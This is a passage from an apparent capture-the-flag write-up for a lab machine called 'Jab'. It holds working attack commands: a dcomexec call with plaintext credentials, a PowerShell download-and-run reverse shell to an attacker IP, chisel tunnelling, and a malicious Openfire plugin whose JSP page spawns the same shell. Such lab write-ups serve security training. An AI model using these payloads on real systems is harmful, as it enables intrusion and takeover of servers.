impacket-dcomexec -debug -silentcommand -object MMC20 jab.htb/svc_openfire:'!@#$%^&*(1qazxsw'@10.129.97.204 'cmd.exe /c powershell iex (New-Object Net.WebClient).DownloadString("http://10.10.16.61/Invoke-PowerShellTcp.ps1");Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.61 -Port 443'
```
![svc_openfire valid credentials](/assets/img/Jab/Jab_10.png)

## privilege escalation

When looking around on the internet for vulnerabilities related to the username openfire i found an interesting [blog post](https://vulncheck.com/blog/openfire-cve-2023-32315). This basically showed me that if you have access to the openfire console  you might be able to upload malicious plugins. We did not have access to the service remotely but when looking at the ports that are locally open we can see that the machine is listening on port 9090. So our first test would be to see if this user is able to log into the openfire admin console.

```
netstat -ano |  select-string 'listening'
```

![Local port open](/assets/img/Jab/Jab_11.png)

So to be able to see what is happening on this port we can upload chisel to proxy all our traffic through the target host. First we run the chisel server using the following command on our machine

```bash
./chisel server --port 5000 --reverse
```
Next I downloaded the chisel client and ran it with the following command

```
wget "http://10.10.16.61/chisel.exe" -outfile "chisel.exe"
.\chisel.exe client 10.10.16.61:5000 R:socks
```
To be able to reach webservices on throught the tunnel we need to first set our burp to use a socks proxy. We can do this in the connections tab of the proxy settings.

![Proxychains](/assets/img/Jab/Jab_12.png)

Then when browsing to **http://localhost:9090** we'd be greeted with the login panel of the openfire admin panel

![login portal](/assets/img/Jab/Jab_13.png)

When we try to log in using the credentials of **svc_openfire** we found earlier we would get access to the admin portal of openfire.

![Access to the portal](/assets/img/Jab/Jab_14.png)

When browsing to the plugin page it seemed like we would be able to upload our own plugins. This could allow us to upload a malicious plugin giving us remote code execution. Seeing that openfire by default runs as system this could mean we get access to the system with elevated permissions. So first we need to create our malicious plugin luckily there are already plenty of examples online on how to make plugins.

First download the plugin template from igniterealtime

```
git clone https://github.com/igniterealtime/openfire-exampleplugin.git
```

Now we need to replace the contents of **/src/main/web/exampleplugin-page.jsp** with our own malicious jsp file. I replaced it with the following jsp code that runs the same reverse shell as before.

```jsp
<%
java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec("powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.16.61/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.61 -Port 444").getInputStream());
%>
```

Next we build the package and add all the necessary files to the jar file

```bash
cp ../webshell.jsp ./src/main/web/exampleplugin-page.jsp
mvn -B package
cp ./target/exampleplugin.jar exampleplugin.zip; zip -ur exampleplugin.zip ./plugin.xml ./readme.html; mv exampleplugin.zip ./target/exampleplugin.jar;
```

After uploading our plugin in the web portal we can clearly see it has been added to the list of plugins

![Plugin uploaded](/assets/img/Jab/Jab_15.png)

Then we browse to the following url, after visiting this url the reverse shell will appear.

```
http://localhost:9090/plugins/exampleplugin/exampleplugin-page.jsp
```

![Reverse shell](/assets/img/Jab/Jab_16.png)
